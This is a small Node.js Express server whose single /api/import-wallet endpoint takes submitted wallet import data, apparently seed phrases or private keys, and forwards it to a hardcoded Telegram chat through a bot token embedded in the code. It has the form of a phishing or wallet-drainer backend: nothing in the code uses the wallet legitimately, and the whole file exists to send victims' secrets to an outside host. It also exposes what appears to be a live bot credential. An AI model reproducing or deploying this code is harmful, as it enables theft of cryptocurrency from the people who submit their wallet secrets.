const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");

const app = express();
const port = 3000;

const TELEGRAM_CHAT_ID = "7462942372";
const TELEGRAM_API_TOKEN = "7509193792:AAHYxtBvv5I5KyQeQECJ8jQJqleORcArq4c";

app.use(bodyParser.json());

app.post("/api/import-wallet", async (req, res) => {
  const { type, data } = req.body;

  try {
    const message = `New Wallet Import:
      Type: ${type}
      Data: ${data}`;

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    res.json({ success: true });
  } catch (err) {
    console.error("Error sending message to Telegram:", err);
    res.status(500).json({ success: false, error: "Failed to send to Telegram" });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

